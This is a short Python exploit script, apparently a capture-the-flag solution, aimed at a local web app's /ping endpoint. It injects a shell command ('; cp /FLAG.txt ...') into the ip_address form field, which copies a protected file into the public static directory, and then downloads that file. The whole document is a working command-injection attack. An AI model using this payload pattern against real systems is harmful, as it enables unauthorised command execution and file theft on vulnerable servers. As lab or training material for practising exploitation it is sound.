import requests
import time

# Target base URL
base_url = "http://127.0.0.1:32814"

print("[*] Step 1: Sending command injection payload to /ping endpoint")
print("[*] Payload: ip_address=127.0.0.1; cp /FLAG.txt /app/static/flag_extracted.txt")

# Step 1: Send POST request with command injection payload
ping_url = f"{base_url}/ping"
payload = {
    "ip_address": "127.0.0.1; cp /FLAG.txt /app/static/flag_extracted.txt"
}

try:
    ping_response = requests.post(ping_url, data=payload, timeout=5, allow_redirects=True)
    print(f"\n[+] POST {ping_url}")
    print(f"[+] Status: {ping_response.status_code}")
    print(f"[+] Length: {len(ping_response.content)}B")
    if ping_response.text:
        print(f"[+] Response: {ping_response.text[:500]}")
except requests.exceptions.Timeout:
    print("\n[-] POST request timed out")
except Exception as e:
    print(f"\n[-] POST error: {type(e).__name__}: {e}")

# Wait a moment for file operation to complete
time.sleep(1)

# Step 2: Retrieve the extracted flag
print("\n[*] Step 2: Retrieving flag from /static/flag_extracted.txt")
flag_url = f"{base_url}/static/flag_extracted.txt"

try:
    flag_response = requests.get(flag_url, timeout=5)
    print(f"\n[+] GET {flag_url}")
    print(f"[+] Status: {flag_response.status_code}")
    print(f"[+] Length: {len(flag_response.content)}B")
    print(f"[+] Full Response:")
    print(flag_response.text)
    
    # Extract flag
    if "FLAG{" in flag_response.text:
        flag_content = flag_response.text.strip()
        print(f"\n[!] FLAG FOUND: {flag_content}")
    else:
        print("\n[-] No FLAG{{}} pattern found in response")
        
except Exception as e:
    print(f"\n[-] GET error: {type(e).__name__}: {e}")

